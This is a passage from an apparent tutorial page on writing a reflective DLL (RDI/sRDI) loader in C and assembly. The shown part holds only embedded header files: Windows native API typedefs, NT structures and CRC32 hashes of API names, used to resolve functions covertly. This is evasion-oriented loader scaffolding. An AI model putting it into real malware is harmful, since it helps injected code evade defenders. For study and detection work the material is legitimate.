          <td id="file-structs-h-L104" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="104"></td>
          <td id="file-structs-h-LC104" class="blob-code blob-code-inner js-file-line">    FileLinkInformationBypassAccessCheck,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L105" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="105"></td>
          <td id="file-structs-h-LC105" class="blob-code blob-code-inner js-file-line">    FileVolumeNameInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L106" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="106"></td>
          <td id="file-structs-h-LC106" class="blob-code blob-code-inner js-file-line">    FileIdInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L107" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="107"></td>
          <td id="file-structs-h-LC107" class="blob-code blob-code-inner js-file-line">    FileIdExtdDirectoryInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L108" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="108"></td>
          <td id="file-structs-h-LC108" class="blob-code blob-code-inner js-file-line">    FileReplaceCompletionInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L109" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="109"></td>
          <td id="file-structs-h-LC109" class="blob-code blob-code-inner js-file-line">    FileHardLinkFullIdInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L110" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="110"></td>
          <td id="file-structs-h-LC110" class="blob-code blob-code-inner js-file-line">    FileIdExtdBothDirectoryInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L111" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="111"></td>
          <td id="file-structs-h-LC111" class="blob-code blob-code-inner js-file-line">    FileDispositionInformationEx,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L112" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="112"></td>
          <td id="file-structs-h-LC112" class="blob-code blob-code-inner js-file-line">    FileRenameInformationEx,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L113" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="113"></td>
          <td id="file-structs-h-LC113" class="blob-code blob-code-inner js-file-line">    FileRenameInformationExBypassAccessCheck,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L114" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="114"></td>
          <td id="file-structs-h-LC114" class="blob-code blob-code-inner js-file-line">    FileDesiredStorageClassInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L115" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="115"></td>
          <td id="file-structs-h-LC115" class="blob-code blob-code-inner js-file-line">    FileStatInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L116" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="116"></td>
          <td id="file-structs-h-LC116" class="blob-code blob-code-inner js-file-line">    FileMaximumInformation</td>
        </tr>
        <tr>
          <td id="file-structs-h-L117" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="117"></td>
          <td id="file-structs-h-LC117" class="blob-code blob-code-inner js-file-line">} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L118" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="118"></td>
          <td id="file-structs-h-LC118" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L119" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="119"></td>
          <td id="file-structs-h-LC119" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _STRING {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L120" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="120"></td>
          <td id="file-structs-h-LC120" class="blob-code blob-code-inner js-file-line">    USHORT Length;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L121" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="121"></td>
          <td id="file-structs-h-LC121" class="blob-code blob-code-inner js-file-line">    USHORT MaximumLength;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L122" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="122"></td>
          <td id="file-structs-h-LC122" class="blob-code blob-code-inner js-file-line">    PCHAR Buffer;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L123" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="123"></td>
          <td id="file-structs-h-LC123" class="blob-code blob-code-inner js-file-line">} ANSI_STRING, *PANSI_STRING;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L124" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="124"></td>
          <td id="file-structs-h-LC124" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L125" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="125"></td>
          <td id="file-structs-h-LC125" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">pragma</span> clang diagnostic pop</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/c7746095ae047ba80ae86ac243f5fb6a/raw/e2ce60ed22c579185fc0b1fd79e215422bfd06c1/structs.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/c7746095ae047ba80ae86ac243f5fb6a#file-structs-h">
          structs.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p><code>defs.h</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/b82be35f1fe5e217082cbc49eb92490b.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121814493" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-defs-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="defs.h">
        <tbody><tr>
          <td id="file-defs-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-defs-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>structs.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-defs-h-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-defs-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-defs-h-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtCurrentThread</span>() ( (HANDLE)(LONG_PTR) -<span class="pl-c1">2</span> )</td>
        </tr>
        <tr>
          <td id="file-defs-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-defs-h-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtCurrentProcess</span>() ( (HANDLE)(LONG_PTR) -<span class="pl-c1">1</span> )</td>
        </tr>
        <tr>
          <td id="file-defs-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-defs-h-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">RTL_CONSTANT_STRING</span>(<span class="pl-v">s</span>) { <span class="pl-k">sizeof</span>(s)-<span class="pl-k">sizeof</span>((s)[<span class="pl-c1">0</span>]), <span class="pl-k">sizeof</span>(s), s }</td>
        </tr>
        <tr>
          <td id="file-defs-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-defs-h-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-defs-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-defs-h-LC7" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_INHERIT</span>                                 <span class="pl-c1">0x00000002L</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-defs-h-LC8" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_PERMANENT</span>                               <span class="pl-c1">0x00000010L</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-defs-h-LC9" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_EXCLUSIVE</span>                               <span class="pl-c1">0x00000020L</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-defs-h-LC10" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_CASE_INSENSITIVE</span>                        <span class="pl-c1">0x00000040L</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-defs-h-LC11" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_OPENIF</span>                                  <span class="pl-c1">0x00000080L</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-defs-h-LC12" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_OPENLINK</span>                                <span class="pl-c1">0x00000100L</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-defs-h-LC13" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_KERNEL_HANDLE</span>                           <span class="pl-c1">0x00000200L</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-defs-h-LC14" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_FORCE_ACCESS_CHECK</span>                      <span class="pl-c1">0x00000400L</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-defs-h-LC15" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_IGNORE_IMPERSONATED_DEVICEMAP</span>           <span class="pl-c1">0x00000800</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-defs-h-LC16" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_DONT_REPARSE</span>                            <span class="pl-c1">0x00001000</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-defs-h-LC17" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OBJ_VALID_ATTRIBUTES</span>                        <span class="pl-c1">0x00001FF2</span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-defs-h-LC18" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-defs-h-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-defs-h-LC19" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">FILL_STRING</span>(<span class="pl-v">string, buffer</span>)                     \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-defs-h-LC20" class="blob-code blob-code-inner js-file-line">	string.Length = (USHORT)strlen(buffer);             \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-defs-h-LC21" class="blob-code blob-code-inner js-file-line">	string.MaximumLength = string.Length;               \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-defs-h-LC22" class="blob-code blob-code-inner js-file-line">	string.Buffer = buffer</td>
        </tr>
        <tr>
          <td id="file-defs-h-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-defs-h-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-defs-h-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-defs-h-LC24" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">InitializeObjectAttributes</span>(<span class="pl-v"> p, n, a, r, s </span>) {   \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-defs-h-LC25" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">Length</span> = <span class="pl-k">sizeof</span>( OBJECT_ATTRIBUTES );          \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-defs-h-LC26" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">RootDirectory</span> = r;                             \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-defs-h-LC27" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">Attributes</span> = a;                                \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-defs-h-LC28" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">ObjectName</span> = n;                                \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-defs-h-LC29" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">SecurityDescriptor</span> = s;                        \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-defs-h-LC30" class="blob-code blob-code-inner js-file-line">    (p)-&gt;<span class="pl-smi">SecurityQualityOfService</span> = <span class="pl-c1">NULL</span>;               \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-defs-h-LC31" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-defs-h-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-defs-h-LC32" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-defs-h-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-defs-h-LC33" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">BOOL</span>     (__stdcall *DLLEntry)(HINSTANCE dll, <span class="pl-k">unsigned</span> <span class="pl-k">long</span> reason, <span class="pl-k">void</span> *reserved);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-defs-h-LC34" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">VOID</span>     (__stdcall *PIO_APC_ROUTINE)(PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,ULONG Reserved);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-defs-h-LC35" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">VOID</span>     (__stdcall *RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PWSTR SourceString);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-defs-h-LC36" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtClose_t)(HANDLE);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L37" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-defs-h-LC37" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *RtlMultiByteToUnicodeN_t)(PWCH UnicodeString,ULONG MaxBytesInUnicodeString,PULONG BytesInUnicodeString,PCSTR MultiByteString,ULONG BytesInMultiByteString);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L38" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-defs-h-LC38" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtReadFile_t)(HANDLE FileHandle,HANDLE Event,PIO_APC_ROUTINE ApcRoutine,PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,PVOID Buffer,ULONG Length,PLARGE_INTEGER <span class="pl-c1">ByteOffset</span>,PULONG Key);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L39" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-defs-h-LC39" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *LdrLoadDll_t)(PCWSTR DllPath, PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID* DllHandle);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L40" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-defs-h-LC40" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *LdrGetProcedureAddress_t)(PVOID DllHandle, PANSI_STRING ProcedureName, ULONG ProcedureNumber, PVOID* ProcedureAddress);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L41" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-defs-h-LC41" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtCreateFile_t)(PHANDLE FileHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes,PIO_STATUS_BLOCK IoStatusBlock,PLARGE_INTEGER AllocationSize,ULONG FileAttributes,ULONG ShareAccess,ULONG CreateDisposition,ULONG CreateOptions,PVOID EaBuffer,ULONG EaLength);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L42" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-defs-h-LC42" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L43" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-defs-h-LC43" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtProtectVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, DWORD NewProtect, PULONG OldProtect);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L44" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-defs-h-LC44" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtFreeVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L45" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-defs-h-LC45" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtReadVirtualMemory_t)(HANDLE ProcessHandle,PVOID BaseAddress,PVOID Buffer,SIZE_T BufferSize,PSIZE_T NumberOfBytesRead);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L46" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="file-defs-h-LC46" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtFlushInstructionCache_t)(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T Length);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L47" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="file-defs-h-LC47" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-en">NTSTATUS</span> (__stdcall *NtQueryInformationFile_t)(HANDLE FileHandle,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass);</td>
        </tr>
        <tr>
          <td id="file-defs-h-L48" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="48"></td>
          <td id="file-defs-h-LC48" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/b82be35f1fe5e217082cbc49eb92490b/raw/38bd14e72ea4bfcc662f8ea717fe0663a9729a82/defs.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/b82be35f1fe5e217082cbc49eb92490b#file-defs-h">
          defs.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p><code>peb.h</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/34f2b25417a2c1d18f92a7549aab88c8.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121814514" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-peb-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="peb.h">
        <tbody><tr>
          <td id="file-peb-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-peb-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdint.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-peb-h-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>defs.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-peb-h-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-peb-h-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">SEED</span> <span class="pl-c1">0xDEADDEAD</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-peb-h-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">HASH</span>(<span class="pl-v">API</span>)(crc32b((<span class="pl-c1">uint8_t</span> *)API))</td>
        </tr>
        <tr>
          <td id="file-peb-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-peb-h-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-peb-h-LC7" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">RtlInitUnicodeString_CRC32b</span>         <span class="pl-c1">0xe17f353f</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-peb-h-LC8" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">RtlMultiByteToUnicodeN_CRC32b</span>       <span class="pl-c1">0xaba11095</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-peb-h-LC9" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">LdrLoadDll_CRC32b</span>                   <span class="pl-c1">0x43638559</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-peb-h-LC10" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">LdrGetProcedureAddress_CRC32b</span>       <span class="pl-c1">0x3b93e684</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-peb-h-LC11" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtCreateFile_CRC32b</span>                 <span class="pl-c1">0x962c4683</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-peb-h-LC12" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtReadFile_CRC32b</span>                   <span class="pl-c1">0xab569438</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-peb-h-LC13" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtClose_CRC32b</span>                      <span class="pl-c1">0xf78fd98f</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-peb-h-LC14" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtAllocateVirtualMemory_CRC32b</span>      <span class="pl-c1">0xec50426f</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-peb-h-LC15" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtReadVirtualMemory_CRC32b</span>          <span class="pl-c1">0x58bdb7be</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
